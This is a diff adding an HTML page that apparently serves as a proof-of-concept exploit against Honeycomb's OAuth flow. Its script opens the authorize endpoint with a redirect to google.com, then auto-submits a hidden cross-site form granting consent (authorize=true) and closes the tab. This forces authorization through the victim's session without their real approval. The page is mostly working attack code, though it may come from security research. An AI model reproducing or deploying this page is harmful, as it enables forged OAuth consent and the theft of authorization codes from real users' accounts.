@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Honeycomb OAuth Automation (New Tab)</title>
+</head>
+<body>
+    <h1>OAuth Flow Automation (New Tab)</h1>
+    <p>Enter the selected-team-slug below, then the authorize tab will open. Form submission will occur shortly after the delay.</p>
+    
+    <label for="team-slug">Selected Team Slug:</label>
+    <input type="text" id="team-slug" value="">
+    <button onclick="startAutomation()">Start Process</button>
+
+    <!-- Hidden form for submission -->
+    <form id="oauth-complete-form" enctype="application/x-www-form-urlencoded" method="POST" action="https://ui.honeycomb.io/oauth/complete" style="display: none;">
+        <input type="text" id="selected-team-slug-input" name="selected-team-slug">
+        <input type="text" name="permission" value="read">
+        <input type="text" name="authorize" value="true">
+    </form>
+
+    <script>
+        function startAutomation() {
+            const teamSlug = document.getElementById('team-slug').value.trim();
+            if (!teamSlug) {
+                alert('Please enter a selected-team-slug value.');
+                return;
+            }
+
+            // Set the form input with user-provided value
+            document.getElementById('selected-team-slug-input').value = teamSlug;
+
+            // Open the authorize URL in a new tab
+            const authorizeUrl = 'https://ui.honeycomb.io/oauth/authorize?response_type=code&client_id=hcaoc_01k9ck8ag2rd2ter56hx1mk832&code_challenge=XfR1dC7g_tyBbPbXHrIPMc3RCWgNDHrcukNj410SxN0&code_challenge_method=S256&redirect_uri=https://google.com/callback&resource=https%3A%2F%2Fmcp.honeycomb.io%2Fmcp';
+            const newTab = window.open(authorizeUrl, '_blank');
+
+            if (newTab) {
+                // Random delay between 1-2 seconds
+                const delay = Math.floor(Math.random() * 1000) + 1000;
+                setTimeout(() => {
+                    // Submit the form (this will likely open in the current tab or a new one depending on browser)
+                    document.getElementById('oauth-complete-form').submit();
+                    
+                    // Attempt to close the new tab after a short additional delay
+                    setTimeout(() => {
+                        if (!newTab.closed) {
+                            newTab.close();
+                        }
+                    }, 500);
+                }, delay);
+            } else {
+                alert('New tab blocked. Please allow popups/new tabs for this site and try again.');
+            }
+        }
+
+        // Optional: Auto-start if value is pre-filled, but manual button for control
+        window.onload = function() {
+            if (document.getElementById('team-slug').value) {
+                // Don't auto-start; wait for user click
+            }
+        };
+    </script>
+</body>
+</html>
